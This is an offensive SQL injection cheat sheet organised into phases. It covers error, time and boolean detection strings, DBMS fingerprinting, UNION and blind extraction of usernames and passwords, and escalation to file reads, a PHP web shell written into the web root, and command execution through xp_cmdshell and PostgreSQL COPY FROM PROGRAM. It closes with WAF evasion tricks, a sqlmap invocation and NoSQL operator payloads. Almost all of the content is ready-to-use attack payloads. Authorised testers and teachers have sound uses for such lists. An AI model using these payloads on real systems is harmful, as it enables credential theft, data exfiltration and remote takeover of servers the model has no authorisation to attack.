# SQL Injection Mastery

Detection, extraction, and escalation of SQL injection vulnerabilities.

## Phase 1: Detection
```
# Error-based detection
'
"
`
')
")
`)
'--
"--
' OR '1'='1
" OR "1"="1
1 OR 1=1
' AND '1'='2
1' ORDER BY 1--+

# Time-based blind
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '0:0:5'--
' OR BENCHMARK(5000000,SHA1('test'))--

# Boolean-based blind
' AND 1=1--   (true — normal response)
' AND 1=2--   (false — different response)
```

## Phase 2: DBMS Identification
| Technique | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|-----------|-------|------------|-------|--------|--------|
| String concat | `CONCAT('a','b')` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` | `'a'\|\|'b'` |
| Version | `@@version` | `version()` | `@@version` | `SELECT banner FROM v$version` | `sqlite_version()` |
| Comment | `-- ` or `#` | `--` | `--` | `--` | `--` |
| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message(('a'),5)` | N/A |

## Phase 3: UNION-Based Extraction
```sql
-- Find column count
' ORDER BY 1-- 
' ORDER BY 2--
' ORDER BY N--   (increment until error)

-- Find injectable column
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Extract databases (MySQL)
' UNION SELECT schema_name,NULL FROM information_schema.schemata--

-- Extract tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- Extract columns
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT username,password FROM users--
```

## Phase 4: Blind Extraction
```sql
-- Boolean-based (extract char by char)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--

-- Time-based
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

## Phase 5: Escalation
```sql
-- Read files (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--

-- Write files (MySQL)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--

-- OS Command (MSSQL)
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

-- Read files (PostgreSQL)
'; CREATE TABLE pwn(data text); COPY pwn FROM '/etc/passwd'; SELECT * FROM pwn;--

-- OS Command (PostgreSQL)
'; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'id';--
```

## WAF Bypass Techniques
- Inline comments: `/*!50000UNION*/+/*!50000SELECT*/`
- Case variation: `uNiOn SeLeCt`
- URL encoding: `%55NION%20%53ELECT`
- Whitespace alternatives: `UNION%0aSELECT`, `UNION%09SELECT`
- No spaces: `UNION(SELECT(1),(2))`
- JSON-based: `{"id":"1 UNION SELECT 1,2,3"}`

## Tips
- Always test with `--` AND `#` as comment terminators
- Try both single and double quotes
- Error-based is fastest, time-based is most reliable
- For blind SQLi, use binary search on ASCII values (halves the requests)
- sqlmap: `sqlmap -u "URL?param=1" --batch --random-agent --level=3 --risk=2`
- Check for second-order SQLi (input stored, executed later in different query)
- NoSQL: try `{"$gt":""}`, `{"$ne":""}`, `{"$regex":".*"}` in JSON params
